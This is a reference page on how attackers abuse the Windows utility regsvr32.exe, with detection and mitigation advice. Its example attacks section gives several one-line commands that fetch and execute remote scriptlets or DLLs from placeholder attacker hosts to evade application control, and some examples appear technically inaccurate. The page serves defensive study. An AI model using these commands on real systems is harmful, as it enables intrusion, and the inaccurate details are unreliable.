# regsvr32.exe
## What is it?
*```regsvr32.exe``` is a legitimate Windows utility used for registering and unregistering Dynamic Link Libraries (DLLs) and ActiveX controls in the Windows registry.*
*It is a trusted system tool that allows applications and services to load DLLs dynamically, ensuring the system operates correctly.*
*Due to its trusted nature, it is often abused by attackers to execute malicious code or bypass security mechanisms.*

## Legitimate Usage
- **Register DLLs** → Register system or third-party DLLs to ensure proper functionality of applications.
- **Unregister DLLs** → Unregister DLLs that are no longer needed or cause conflicts with applications.
- **ActiveX Control Management** → Used to register or unregister ActiveX controls in web applications.
- **Software Installation** → Some installation scripts use ```regsvr32.exe``` to register DLLs as part of the installation process.

## How to abuse it
- **Bypass Execution Restrictions** → Attackers can use ```regsvr32.exe``` to execute malicious scripts or payloads while bypassing security mechanisms such as antivirus or execution policies.
- **Fileless Malware Execution** → Using a remote DLL or malicious script, attackers can execute code without writing it to disk.
- **Bypass AppLocker or Software Restriction Policies** → Since ```regsvr32.exe``` is a whitelisted executable, attackers can abuse it to execute payloads from trusted locations, evading detection.
- **Persistence Mechanism** → Attackers can use ```regsvr32.exe``` in conjunction with remote DLLs to ensure persistence on a compromised system.

## Example attacks
### 1. Executing a Malicious DLL
*Attackers can use ```regsvr32.exe``` to load a malicious DLL from a remote server or local path and execute it.*

**Execute Malicious DLL from Remote Server**

```
regsvr32.exe /s /n /u /i:http://attacker.com/malicious.dll

regsvr32.exe /s /i:http://10.0.0.5/file.sct scrobj.dll

regsvr32.exe /s /n /u /i:http://malicious[.]site/payload.sct scrobj.dll

regsvr32.exe /u /s /i:payload.sct scrobj.dll
```

calc.exe is spawned by regsvr32.exe:

![image](https://github.com/user-attachments/assets/2d8bab8b-8a61-4b73-92a0-f7e06e90fe7a)

However, sysmon will show regsvr32 establishing a network connection:

![image](https://github.com/user-attachments/assets/7a0a4e63-47a9-4a3a-8987-1e449171381e)

**Effect:**
- ```/s``` → Suppresses the success message, making it stealthy.
- ```/n``` → Bypasses the DLL registration process.
- ```/u``` → Unregisters the DLL after execution.
- Executes the malicious DLL on the target machine.

### 2. Fileless Malware Execution
*Bypassing traditional detection methods, attackers can execute a payload directly from memory using regsvr32.exe and a remote DLL.*

**Execute Malicious DLL without Writing to Disk**

```
regsvr32.exe /s /i:http://attacker.com/malicious.dll
```

**Effect:**
- Loads and executes the DLL directly from memory, avoiding detection by file-based security solutions.

### 3. Using regsvr32 for Persistence
*Attackers can leverage regsvr32.exe to register malicious DLLs or scripts to ensure persistence.*

**Create Persistence with regsvr32**

```
regsvr32.exe /s /n /u /i:http://attacker.com/persistence.dll
```

**Effect:**
- Registers a malicious DLL that persists across reboots, as it may be automatically loaded during system startup.

### 4. Bypassing Application Control (AppLocker)
*Since regsvr32.exe is a trusted system binary, attackers can use it to bypass security controls such as AppLocker or Software Restriction Policies (SRP).*

**Bypass AppLocker to Execute Malicious Payload**

```
regsvr32.exe /s /i:http://attacker.com/payload.dll
```

**Effect:**
- Executes a malicious payload using regsvr32.exe, which is allowed to run despite other restrictions on executables.

### 5. Remote Code Execution via regsvr32
*Attackers can use regsvr32 to execute commands on a remote system using a specially crafted DLL.*

**Execute Remote Code via regsvr32**

```
regsvr32.exe /s /n /i:http://attacker.com/remote_payload.dll
```

**Effect:**
- Executes a payload located on a remote server, enabling remote code execution on the target system.

# Detection & Mitigation
## Detection Methods
**Monitor regsvr32 Executions**
- **Event ID 4688 (Process Creation)** → Detect when ```regsvr32.exe``` is executed with suspicious arguments like `/i` or from unusual paths.
- **Fileless Execution Detection** → Detect unusual network traffic associated with ```regsvr32.exe``` downloading DLLs or payloads from remote servers.
- **Behavioral Analysis** → Monitor for anomalous behaviors, such as the execution of ```regsvr32.exe``` followed by processes that exhibit fileless characteristics.

**Analyze Network Traffic**
- **Monitor Outbound Connections** → Track any outbound connections initiated by ```regsvr32.exe```, particularly those to suspicious or known malicious IP addresses.

**Log Suspicious File Changes**
- **Event ID 4663 (File Access)** → Detect changes to the file system that could indicate a malicious DLL or script is being executed via regsvr32.

## Mitigation Strategies
- **Restrict regsvr32 Access** → Use AppLocker, Device Guard, or similar application control tools to block or restrict the execution of regsvr32 for unauthorized users or processes.
- **Disable Scripting & DLL Loading** → Prevent the use of ```regsvr32.exe``` for loading external DLLs, especially from remote locations.
- **Monitor for Suspicious Scheduled Tasks** → Detect and remove any scheduled tasks or scripts that rely on ```regsvr32.exe``` for persistence.
- **Use Endpoint Protection Software** → Use security software to scan and block malicious DLLs that might be executed through regsvr32.exe.
- **Regularly Review Security Logs** → Look for patterns that suggest regsvr32.exe is being used for malicious purposes, including execution from non-standard locations or with unusual parameters.
